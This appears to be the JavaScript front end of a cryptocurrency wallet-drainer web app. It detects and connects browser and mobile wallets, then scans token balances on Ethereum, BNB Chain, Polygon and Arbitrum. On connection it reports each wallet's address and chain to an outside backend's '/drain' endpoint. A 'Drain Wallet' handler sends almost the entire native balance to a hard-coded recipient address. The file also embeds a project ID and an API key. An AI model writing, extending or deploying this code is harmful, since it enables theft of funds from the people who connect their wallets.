// First, let's check if ethers is available
if (typeof ethers === 'undefined') {
    console.error("❌ ethers.js is not loaded!");
    // Load ethers from CDN if not available
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js';
    script.onload = initializeApp;
    document.head.appendChild(script);
} else {
    document.addEventListener('DOMContentLoaded', initializeApp);
}

// Configuration
const CONFIG = {
    projectId: "962425907914a3e80a7d8e7288b23f62",
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    // RPC Providers
    rpcProviders: {
        1: "https://eth.llamarpc.com",
        56: "https://bsc-dataseed.binance.org",
        137: "https://polygon-rpc.com",
        42161: "https://arb1.arbitrum.io/rpc"
    },
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    },
    
    networkChainIds: {
        1: "0x1",
        56: "0x38",
        137: "0x89",
        42161: "0xa4b1"
    }
};

// Global state
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let walletProvider = null;

// DOM Elements
let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;

async function initializeApp() {
    console.log('🔄 Initializing app...');
    
    try {
        // Get DOM elements
        connectBtn = document.getElementById("connectBtn");
        statusEl = document.getElementById("status");
        tokensEl = document.getElementById("tokens");
        tokensContainer = document.getElementById("tokensContainer");
        drainBtn = document.getElementById("drainBtn");
        scanAllBtn = document.getElementById("scanAllBtn");
        chainSelector = document.getElementById("chainSelector");
        networkSelect = document.getElementById("networkSelect");
        tokenCount = document.getElementById("tokenCount");

        if (!connectBtn) {
            console.error('❌ CRITICAL: Connect button not found!');
            updateStatus('Error: Connect button not found');
            return;
        }
        
        console.log('✅ DOM elements found');
        
        // Setup event listeners FIRST
        setupEventListeners();
        
        // Test backend connection
        await testBackend();
        
        // Check for existing wallet connection
        await checkExistingConnection();
        
        console.log("✅ App initialized successfully");
        updateStatus("✅ Ready! Click 'Connect Wallet' to begin");
        
    } catch (error) {
        console.error("❌ Initialization error:", error);
        updateStatus("Failed to initialize: " + error.message);
    }
}

async function testBackend() {
    try {
        updateStatus('🔄 Checking backend connection...');
        const response = await fetch(`${CONFIG.backendUrl}/health`);
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend is online:", data);
            return true;
        } else {
            console.log("⚠️ Backend health check failed");
            return false;
        }
    } catch (error) {
        console.log("⚠️ Backend unreachable:", error.message);
        return false;
    }
}

function setupEventListeners() {
    console.log("🔄 Setting up event listeners...");
    
    // Connect button - using onclick for direct handling
    if (connectBtn) {
        connectBtn.onclick = handleConnect;
        console.log("✅ Connect button listener added");
    }
    
    // Drain button
    if (drainBtn) {
        drainBtn.addEventListener("click", handleDrain);
    }
    
    // Scan all chains button
    if (scanAllBtn) {
        scanAllBtn.addEventListener("click", handleScanAll);
    }
    
    // Network selector
    if (networkSelect) {
        networkSelect.addEventListener("change", handleNetworkChange);
        // Populate network options
        populateNetworkOptions();
    }
}

function populateNetworkOptions() {
    if (!networkSelect) return;
    
    // Clear existing options except first one
    while (networkSelect.options.length > 1) {
        networkSelect.remove(1);
    }
    
    // Add network options
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = name;
        networkSelect.appendChild(option);
    });
}

// Mobile wallet detection - CRITICAL FOR MOBILE
function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function getMobileWalletLinks() {
    if (isMobileDevice()) {
        const userAgent = navigator.userAgent.toLowerCase();
        
        if (userAgent.includes('iphone') || userAgent.includes('ipad')) {
            // iOS
            return {
                metamask: 'https://metamask.app.link/dapp/' + window.location.hostname,
                trust: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href),
                coinbase: 'https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href)
            };
        } else {
            // Android
            return {
                metamask: 'https://metamask.app.link/dapp/' + window.location.hostname + window.location.pathname,
                trust: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href),
                coinbase: 'https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href)
            };
        }
    }
    return null;
}

async function checkExistingConnection() {
    try {
        // Try multiple ways to detect wallet
        const detectedProvider = await detectWalletProvider();
        
        if (detectedProvider) {
            walletProvider = detectedProvider;
            
            // Check if already connected
            if (typeof walletProvider.request !== 'undefined') {
                try {
                    const accounts = await walletProvider.request({ method: 'eth_accounts' });
                    
                    if (accounts && accounts.length > 0) {
                        const chainIdHex = await walletProvider.request({ method: 'eth_chainId' });
                        const chainId = parseInt(chainIdHex, 16);
                        
                        console.log("🔄 Found existing connection:", accounts[0]);
                        await handleConnected(accounts[0], chainId, walletProvider);
                        return true;
                    }
                } catch (error) {
                    console.log("⚠️ Error checking existing accounts:", error.message);
                }
            }
        }
        return false;
    } catch (error) {
        console.log("⚠️ Error checking existing connection:", error.message);
        return false;
    }
}

async function detectWalletProvider() {
    console.log("🔄 Detecting wallet provider...");
    
    // Check if we're on mobile
    if (isMobileDevice()) {
        console.log("📱 Mobile device detected");
        
        // On mobile, we need to check for injected providers differently
        // Many mobile wallets inject their provider when the dapp is opened via deeplink
        
        // Wait a moment for mobile wallets to inject
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    // List of wallet providers to check (in order of priority)
    const providersToCheck = [
        { name: 'ethereum', check: () => window.ethereum },
        { name: 'web3', check: () => window.web3?.currentProvider },
        { name: 'coinbase', check: () => window.coinbaseWalletExtension },
        { name: 'trust', check: () => window.trustwallet },
        { name: 'binance', check: () => window.BinanceChain },
        { name: 'phantom', check: () => window.phantom?.ethereum },
        { name: 'brave', check: () => window.ethereum?.isBraveWallet ? window.ethereum : null }
    ];
    
    for (const providerInfo of providersToCheck) {
        const provider = providerInfo.check();
        if (provider) {
            console.log(`✅ Detected ${providerInfo.name} wallet`);
            return provider;
        }
    }
    
    // Check for EIP-6963 providers
    const eip6963Providers = await detectEIP6963Providers();
    if (eip6963Providers.length > 0) {
        console.log(`✅ Detected ${eip6963Providers.length} EIP-6963 provider(s)`);
        return eip6963Providers[0].provider;
    }
    
    console.log("❌ No wallet provider detected");
    return null;
}

async function detectEIP6963Providers() {
    return new Promise((resolve) => {
        const providers = [];
        
        // Listen for EIP-6963 events
        const handleProviderAnnouncement = (event) => {
            console.log("🔄 EIP-6963 provider detected:", event.detail.info.name);
            providers.push(event.detail);
        };
        
        window.addEventListener('eip6963:announceProvider', handleProviderAnnouncement);
        
        // Request provider announcements
        window.dispatchEvent(new Event('eip6963:requestProvider'));
        
        // Wait for responses
        setTimeout(() => {
            window.removeEventListener('eip6963:announceProvider', handleProviderAnnouncement);
            resolve(providers);
        }, 300);
    });
}

async function handleConnect() {
    console.log("🔄 Connect button clicked!");
    
    try {
        // If already connected, disconnect
        if (isConnected) {
            await handleDisconnect();
            return;
        }
        
        updateStatus("🔄 Connecting wallet...");
        
        // On mobile, we might need to guide users to open in wallet app
        if (isMobileDevice() && !window.ethereum) {
            showMobileWalletGuide();
            return;
        }
        
        // Detect wallet provider
        const detectedProvider = await detectWalletProvider();
        
        if (!detectedProvider) {
            updateStatus("❌ No wallet detected!");
            showWalletOptions();
            return;
        }
        
        walletProvider = detectedProvider;
        
        // Request connection
        await requestWalletConnection(walletProvider);
        
    } catch (error) {
        console.error("❌ Connection error:", error);
        
        // Handle specific error cases
        if (error.code === 4001 || error.code === -32603) {
            updateStatus("❌ Connection rejected by user");
        } else if (error.code === -32002) {
            updateStatus("🔄 Connection already pending. Please check your wallet.");
        } else {
            updateStatus(`❌ Connection failed: ${error.message}`);
        }
    }
}

function showMobileWalletGuide() {
    const mobileLinks = getMobileWalletLinks();
    
    let guideHTML = `
        <div style="margin: 10px 0; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404;">📱 Mobile Wallet Detected</h4>
            <p>For best experience, open this dapp in your wallet browser:</p>
            <div style="display: flex; flex-direction: column; gap: 10px; margin: 15px 0;">
    `;
    
    if (mobileLinks) {
        guideHTML += `
            <a href="${mobileLinks.metamask}" 
               style="padding: 12px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none; text-align: center;">
                Open in MetaMask
            </a>
            <a href="${mobileLinks.trust}" 
               style="padding: 12px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none; text-align: center;">
                Open in Trust Wallet
            </a>
            <a href="${mobileLinks.coinbase}" 
               style="padding: 12px; background: #0052ff; color: white; border-radius: 5px; text-decoration: none; text-align: center;">
                Open in Coinbase Wallet
            </a>
        `;
    }
    
    guideHTML += `
            </div>
            <p><small>Or tap "Connect Wallet" again after opening in your wallet browser.</small></p>
        </div>
    `;
    
    if (statusEl) {
        statusEl.innerHTML = guideHTML;
    }
}

async function requestWalletConnection(provider) {
    try {
        console.log("🔄 Requesting wallet connection...");
        
        let accounts;
        
        // Modern EIP-1193 providers
        if (typeof provider.request === 'function') {
            accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
        }
        // Legacy providers
        else if (typeof provider.enable === 'function') {
            accounts = await provider.enable();
        }
        // Very old providers
        else if (typeof provider.sendAsync === 'function') {
            accounts = await new Promise((resolve, reject) => {
                provider.sendAsync(
                    { method: 'eth_requestAccounts' },
                    (error, response) => {
                        if (error) reject(error);
                        else resolve(response.result);
                    }
                );
            });
        }
        // If none of the above, try to get accounts directly
        else if (typeof provider.send === 'function') {
            accounts = await new Promise((resolve, reject) => {
                provider.send({ method: 'eth_accounts' }, (error, response) => {
                    if (error) reject(error);
                    else resolve(response.result);
                });
            });
        }
        else {
            throw new Error("Wallet provider doesn't support connection requests");
        }
        
        if (!accounts || accounts.length === 0) {
            throw new Error("User rejected connection or no accounts found");
        }
        
        // Get current chain
        let chainId;
        if (typeof provider.request === 'function') {
            const chainIdHex = await provider.request({ method: 'eth_chainId' });
            chainId = parseInt(chainIdHex, 16);
        } else {
            // Fallback: assume Ethereum mainnet
            chainId = 1;
        }
        
        console.log("✅ Wallet connected:", accounts[0], "Chain:", chainId);
        
        // Handle the connection
        await handleConnected(accounts[0], chainId, provider);
        
    } catch (error) {
        console.error("❌ Wallet connection request failed:", error);
        throw error;
    }
}

async function handleConnected(account, chainId, provider) {
    try {
        console.log("🔄 Handling connection...");
        
        // Validate inputs
        if (!account) {
            throw new Error("Invalid account address");
        }
        
        if (!chainId) {
            chainId = 1; // Default to Ethereum
        }
        
        if (!provider) {
            throw new Error("No wallet provider available");
        }
        
        // Update global state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        walletProvider = provider;
        
        // SAFELY setup provider and signer
        try {
            // Check if ethers is available
            if (typeof ethers === 'undefined') {
                throw new Error("ethers.js not loaded");
            }
            
            // Create provider
            provider = new ethers.providers.Web3Provider(walletProvider);
            signer = provider.getSigner();
            console.log("✅ Provider and signer setup successfully");
        } catch (providerError) {
            console.error("❌ Provider setup error:", providerError);
            
            // Fallback: Use RPC provider for read-only
            try {
                const rpcUrl = CONFIG.rpcProviders[chainId] || CONFIG.rpcProviders[1];
                provider = new ethers.providers.JsonRpcProvider(rpcUrl);
                console.log("⚠️ Using fallback RPC provider (read-only)");
            } catch (rpcError) {
                console.error("❌ RPC provider also failed:", rpcError);
                updateStatus("⚠️ Limited functionality - wallet connected but provider setup failed");
            }
        }
        
        // Update UI
        if (connectBtn) {
            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
            connectBtn.onclick = handleDisconnect;
        }
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chainName}\n⛓️ Chain ID: ${chainId}`);
        
        // Show UI elements
        showUIElements();
        
        // Update network selector
        if (chainSelector && networkSelect) {
            chainSelector.classList.remove("hidden");
            networkSelect.value = chainId;
        }
        
        // Setup wallet event listeners
        setupWalletEventListeners(walletProvider);
        
        // Log connection to backend
        await logConnectionToBackend(currentAccount, chainId);
        
        // Fetch tokens
        await fetchTokens(currentAccount, chainId);
        
        console.log("✅ Connection fully established");
        
    } catch (error) {
        console.error("❌ Connected handler error:", error);
        updateStatus("Connection setup failed: " + error.message);
        
        // Reset state on error
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
        walletProvider = null;
    }
}

function setupWalletEventListeners(provider) {
    if (!provider) return;
    
    try {
        // Modern EIP-1193 events
        if (typeof provider.on === 'function') {
            // Listen for account changes
            provider.on('accountsChanged', async (accounts) => {
                console.log("🔄 Accounts changed:", accounts);
                if (accounts.length === 0) {
                    // User disconnected
                    handleDisconnected();
                } else if (currentAccount !== accounts[0]) {
                    // Account changed
                    currentAccount = accounts[0];
                    updateStatus(`🔄 Account changed to: ${currentAccount.slice(0, 8)}...`);
                    await fetchTokens(currentAccount, currentChainId);
                }
            });
            
            // Listen for chain changes
            provider.on('chainChanged', async (chainIdHex) => {
                const chainId = parseInt(chainIdHex, 16);
                console.log("🔄 Chain changed:", chainId);
                
                // Update UI
                currentChainId = chainId;
                updateStatus(`🔄 Network changed to: ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
                
                // Update network selector
                if (networkSelect) {
                    networkSelect.value = chainId;
                }
                
                // Refresh tokens
                if (currentAccount) {
                    await fetchTokens(currentAccount, chainId);
                }
            });
            
            // Listen for disconnection
            provider.on('disconnect', (error) => {
                console.log("🔄 Wallet disconnected:", error);
                handleDisconnected();
            });
        }
        
    } catch (error) {
        console.log("⚠️ Error setting up wallet event listeners:", error.message);
    }
}

async function handleDisconnect() {
    console.log("🔄 Disconnecting...");
    
    try {
        updateStatus("🔄 Disconnecting...");
        
        // Try to disconnect from wallet if supported
        if (walletProvider && typeof walletProvider.disconnect === 'function') {
            try {
                await walletProvider.disconnect();
            } catch (error) {
                console.log("ℹ️ Wallet doesn't support disconnect method or already disconnected");
            }
        }
        
        // Also try legacy disconnect methods
        if (window.ethereum && typeof window.ethereum.disconnect === 'function') {
            try {
                await window.ethereum.disconnect();
            } catch (error) {
                // Ignore - not all wallets support this
            }
        }
        
    } catch (error) {
        console.error("❌ Error during disconnect:", error);
    } finally {
        // Always reset local state
        handleDisconnected();
    }
}

function handleDisconnected() {
    console.log("🔄 Resetting connection state...");
    
    // Reset global state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    walletProvider = null;
    
    // Update UI
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
        connectBtn.onclick = handleConnect;
    }
    
    updateStatus("Disconnected. Click 'Connect Wallet' to begin.");
    hideUIElements();
}

async function logConnectionToBackend(address, chainId) {
    try {
        console.log("🔄 Logging connection to backend...");
        
        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            }),
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend logged connection:", data);
        } else {
            console.log("⚠️ Backend logging failed");
        }
        
    } catch (error) {
        console.log("⚠️ Backend logging failed:", error.message);
    }
}

async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        // Try backend first
        const backendOnline = await testBackend();
        if (backendOnline) {
            const response = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`);
            
            if (response.ok) {
                const data = await response.json();
                if (data.success && data.data.tokens && data.data.tokens.length > 0) {
                    displayTokens(data.data.tokens);
                    updateStatus(`✅ Found ${data.data.tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
                    return;
                }
            }
        }
        
        // Fallback to direct Covalent API
        await fetchTokensFromCovalent(address, chainId);
        
    } catch (error) {
        console.error("❌ Token fetch error:", error);
        await fetchTokensFromCovalent(address, chainId);
    }
}

async function fetchTokensFromCovalent(address, chainId) {
    if (!tokensEl) return;
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) {
            throw new Error(`Covalent API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                    name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                    amount: amount,
                    formattedAmount: amount.toLocaleString(undefined, {
                        minimumFractionDigits: 0,
                        maximumFractionDigits: 6
                    }),
                    value: value,
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    isNative: t.native_token || false
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
            updateStatus("ℹ️ No tokens found on this chain");
        }
        
    } catch (error) {
        console.error("❌ Covalent error:", error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens from Covalent API</div>';
        updateStatus("⚠️ Token scan failed");
    }
}

function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount || token.amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</div>
                ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
    
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById("drainBtn");
    
    try {
        updateStatus("🚀 Starting drain process...");
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = "⏳ Draining...";
        }
        
        // Ensure we have a signer
        if (!signer && walletProvider) {
            try {
                provider = new ethers.providers.Web3Provider(walletProvider);
                signer = provider.getSigner();
            } catch (error) {
                throw new Error("Cannot create signer. Please reconnect wallet.");
            }
        }
        
        if (!signer) {
            throw new Error("No signer available. Please reconnect wallet.");
        }
        
        // Get native token balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        // Check if enough for gas
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
            
            const receipt = await tx.wait();
            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
            
            // Refresh token display
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus("⚠️ Not enough native token for gas");
        }
        
    } catch (error) {
        console.error("❌ Drain error:", error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        const drainBtn = document.getElementById("drainBtn");
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = "⚡ Drain Wallet";
        }
    }
}

async function handleScanAll() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    updateStatus("🔄 Scanning all supported chains...");
    
    try {
        const chains = [1, 56, 137, 42161]; // All supported chain IDs
        let allTokens = [];
        
        for (const chainId of chains) {
            updateStatus(`🔄 Scanning ${CONFIG.networkNames[chainId]}...`);
            
            try {
                const response = await fetch(
                    `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
                );
                
                if (response.ok) {
                    const data = await response.json();
                    const items = data?.data?.items || [];
                    
                    const chainTokens = items
                        .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
                        .map(t => {
                            const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                            const value = (t.quote_rate || 0) * amount;
                            
                            return {
                                symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                                name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                                amount: amount,
                                formattedAmount: amount.toLocaleString(undefined, { maximumFractionDigits: 6 }),
                                value: value,
                                formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                                contractAddress: t.contract_address,
                                isNative: t.native_token || false,
                                chainId: chainId,
                                chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`
                            };
                        });
                    
                    allTokens = allTokens.concat(chainTokens);
                }
            } catch (error) {
                console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
            }
        }
        
        if (allTokens.length > 0) {
            displayAllChainTokens(allTokens);
            updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
        } else {
            updateStatus("ℹ️ No tokens found across any supported chain");
        }
        
    } catch (error) {
        console.error("❌ Scan all error:", error);
        updateStatus("❌ Failed to scan all chains: " + error.message);
    }
}

function displayAllChainTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '<div class="all-chains-header">Tokens Across All Chains</div>';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        const chainTotal = chainTokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span>${chainName}</span>
                    <span class="chain-total">$${chainTotal.toFixed(2)}</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item">
                        <div class="token-info">
                            <span class="token-symbol">${token.symbol}</span>
                            <span class="token-name">${token.name}</span>
                        </div>
                        <div>
                            <div class="token-amount">${token.formattedAmount}</div>
                            ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} tokens across ${Object.keys(tokensByChain).length} chains • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId || !isConnected) {
        return;
    }
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
        
        // Try to switch network in wallet
        if (walletProvider && typeof walletProvider.request !== 'undefined') {
            try {
                await walletProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: CONFIG.networkChainIds[newChainId] || `0x${newChainId.toString(16)}` }]
                });
                
                // The chainChanged event listener will handle the rest
                
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask
                if (switchError.code === 4902) {
                    // Try to add the chain
                    await addChainToWallet(newChainId);
                } else {
                    throw switchError;
                }
            }
        } else {
            // Just update locally and fetch tokens
            currentChainId = newChainId;
            await fetchTokens(currentAccount, newChainId);
        }
        
    } catch (error) {
        console.error("❌ Network switch error:", error);
        updateStatus(`❌ Failed to switch network: ${error.message}`);
        // Reset selector
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

async function addChainToWallet(chainId) {
    const chainParams = {
        1: {
            chainId: '0x1',
            chainName: 'Ethereum Mainnet',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[1]],
            blockExplorerUrls: ['https://etherscan.io']
        },
        56: {
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[56]],
            blockExplorerUrls: ['https://bscscan.com']
        },
        137: {
            chainId: '0x89',
            chainName: 'Polygon Mainnet',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[137]],
            blockExplorerUrls: ['https://polygonscan.com']
        },
        42161: {
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[42161]],
            blockExplorerUrls: ['https://arbiscan.io']
        }
    };
    
    if (chainParams[chainId] && walletProvider && typeof walletProvider.request !== 'undefined') {
        try {
            await walletProvider.request({
                method: 'wallet_addEthereumChain',
                params: [chainParams[chainId]]
            });
        } catch (addError) {
            console.error("❌ Failed to add chain:", addError);
            throw addError;
        }
    }
}

function showWalletOptions() {
    const walletOptions = `
        <div style="margin: 10px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; border: 1px solid #ddd;">
            <h4 style="margin-top: 0; color: #dc3545;">No Wallet Detected</h4>
            <p>Please install one of these wallets to continue:</p>
            <div style="display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="padding: 10px 15px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none;">
                    🔵 MetaMask
                </a>
                <a href="https://wallet.coinbase.com/" target="_blank"
                   style="padding: 10px 15px; background: #0052ff; color: white; border-radius: 5px; text-decoration: none;">
                    🔷 Coinbase Wallet
                </a>
                <a href="https://trustwallet.com/" target="_blank"
                   style="padding: 10px 15px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none;">
                    🔶 Trust Wallet
                </a>
            </div>
            <p><small>After installing, refresh this page and click "Connect Wallet" again.</small></p>
        </div>
    `;
    
    if (statusEl) {
        // Append to existing status
        statusEl.innerHTML = walletOptions;
    }
}

function showUIElements() {
    const elements = [chainSelector, drainBtn, scanAllBtn, tokensContainer];
    elements.forEach(el => {
        if (el) el.classList.remove("hidden");
    });
}

function hideUIElements() {
    const elements = [chainSelector, drainBtn, scanAllBtn, tokensContainer];
    elements.forEach(el => {
        if (el) el.classList.add("hidden");
    });
    
    if (tokensEl) tokensEl.innerHTML = "";
    if (tokenCount) tokenCount.textContent = "0 tokens";
}

function updateStatus(message) {
    if (statusEl) {
        // Keep it simple - just update text
        statusEl.textContent = message;
    }
}

// Debug info and helper functions
console.log("=== App Debug Info ===");
console.log("Ethers available:", typeof ethers !== 'undefined');
console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');
console.log("Window.web3:", typeof window.web3 !== 'undefined');
console.log("Is Mobile:", isMobileDevice());
console.log("Navigator.userAgent:", navigator.userAgent);
console.log("======================");

// Export for debugging
window.appDebug = {
    getState: () => ({
        isConnected,
        currentAccount,
        currentChainId,
        walletProvider: !!walletProvider,
        provider: !!provider,
        signer: !!signer
    }),
    detectWallet: detectWalletProvider,
    reconnect: handleConnect,
    disconnect: handleDisconnect,
    fetchTokens: () => fetchTokens(currentAccount, currentChainId)
};

console.log("Debug helpers available at: window.appDebug");
